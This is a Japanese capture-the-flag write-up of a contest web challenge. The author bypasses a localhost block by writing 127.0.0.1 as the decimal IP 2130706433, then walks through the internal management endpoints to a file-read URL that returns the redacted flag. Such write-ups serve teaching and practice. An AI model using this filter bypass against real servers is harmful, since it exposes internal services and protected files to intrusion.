---
title: 'WebProxyの向こう側'
description: '防衛省サイバーコンテスト2026のWriteupです。'
pubDate: 2026-02-02
category: 'CTF'
tags: ['Ministry of Defense Cyber Contest', 'Writeup', 'Web', 'Bypass']
---

# WebProxyの向こう側 - 防衛省サイバーコンテスト

## Web調査
> サーバー側で 127.0.0.1 や localhost が制限されている可能性を考慮し、IPアドレスとして解釈される別表現を調査した。

- http://2130706433:8081

```html
<html>
        <head><title>Internal Management System</title></head>
        <body>
            <h1>🖥️ Internal Management System</h1>
            <p>内部管理システムへようこそ。アクセス可能な情報を以下に表示します。</p>
            <hr>
            <h2>📋 システム情報</h2>
            <ul>
                <li><a href="/system/info">/system/info</a> - システム基本情報</li>
                <li><a href="/system/services">/system/services</a> - 実行中サービス一覧</li>
                <li><a href="/system/logs">/system/logs</a> - システムログ</li>
                <li><a href="/system/config">/system/config</a> - 設定ファイル情報</li>
                <li><a href="/system/users">/system/users</a> - ユーザー情報</li>
            </ul>
            <hr>
            <h2>🔍 探索のヒント</h2>
            <p>このシステムには隠された機能があります。各エンドポイントの情報を注意深く調べてください。</p>
            <p><strong>目標:</strong> 機密フラグファイルの場所を特定してアクセスする</p>
        </body>
        </html>
```
```bash
# /system/info
{"admin_note":"\u30d0\u30c3\u30af\u30a2\u30c3\u30d7\u30b9\u30af\u30ea\u30d7\u30c8\u306e\u5b9f\u884c\u30ed\u30b0\u3092\u78ba\u8a8d\u3059\u308b\u3053\u3068","backup_location":"/var/backups/system/","config_version":"v2.1.4","hostname":"internal-mgmt-01","last_backup":"2024-12-08 03:00:15","os":"Ubuntu 20.04.6 LTS","services_running":15,"uptime":"45 days, 12:34:56"}
```
```bash
# /system/logs
{"debug_enabled":true,"hint":"\u30d0\u30c3\u30af\u30a2\u30c3\u30d7\u5834\u6240\u306b\u6a5f\u5bc6\u30d5\u30a1\u30a4\u30eb\u304c\u79fb\u52d5\u3055\u308c\u307e\u3057\u305f","log_level":"INFO","recent_logs":["[2024-12-09 10:15:32] INFO: System startup completed","[2024-12-09 10:16:45] INFO: Backup daemon initialized","[2024-12-09 10:17:12] WARN: secret-keeper service offline for maintenance","[2024-12-09 10:18:00] INFO: Debug endpoint enabled for troubleshooting","[2024-12-09 10:19:23] DEBUG: Flag file flag_20241209.txt created and moved to backup location","[2024-12-09 10:20:15] INFO: User access from 192.168.1.100"]}
```

> flagが書かれてそうなURLを見つけた
```bash
# /system/services
{"active_services":[{"name":"nginx","pid":1234,"status":"active"},{"name":"mysql","pid":2345,"status":"active"},{"name":"backup-daemon","pid":3456,"status":"active"},{"name":"log-rotator","pid":4567,"status":"active"},{"name":"secret-keeper","note":"\u5b9a\u671f\u30e1\u30f3\u30c6\u30ca\u30f3\u30b9\u4e2d","pid":null,"status":"inactive"}],"debug_info":"secret-keeper \u30b5\u30fc\u30d3\u30b9\u306f /system/debug?service=secret-keeper \u3067\u8a73\u7d30\u78ba\u8a8d\u53ef\u80fd","maintenance_mode":false,"total_services":15}
```
```bash
# /system/debug?service=secret-keeper
{"backup_structure":{"access_method":"Use /system/files endpoint with path and file parameters","base_path":"/var/backups/system/","current_files":["flag_20241209.txt","flag_backup.txt"],"example_access":"/system/files?path=secrets/flags/&file=config.txt","secrets_dir":"secrets/flags/"},"last_operation":"flag relocation to backup directory","maintenance_note":"\u30d5\u30e9\u30b0\u30d5\u30a1\u30a4\u30eb\u306f\u30d0\u30c3\u30af\u30a2\u30c3\u30d7\u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u306b\u5b89\u5168\u306b\u4fdd\u5b58\u3055\u308c\u3066\u3044\u307e\u3059","recent_activity":"\u4eca\u65e5 (2024-12-09) \u4f5c\u6210\u3055\u308c\u305f\u30d5\u30a1\u30a4\u30eb\u304c\u6700\u65b0\u306e\u6a5f\u5bc6\u30c7\u30fc\u30bf\u3067\u3059","service":"secret-keeper","status":"maintenance"}
```
```bash
# /system/files?path=secrets/flags/&file=flag_20241209.txt
{"content":"flag{***}","created_by":"backup-daemon","file_type":"secret","filename":"flag_20241209.txt","note":"\ud83c\udf89 \u6a5f\u5bc6\u30d5\u30e9\u30b0\u30d5\u30a1\u30a4\u30eb\u306e\u767a\u898b\u306b\u6210\u529f\u3057\u307e\u3057\u305f\uff01"}
```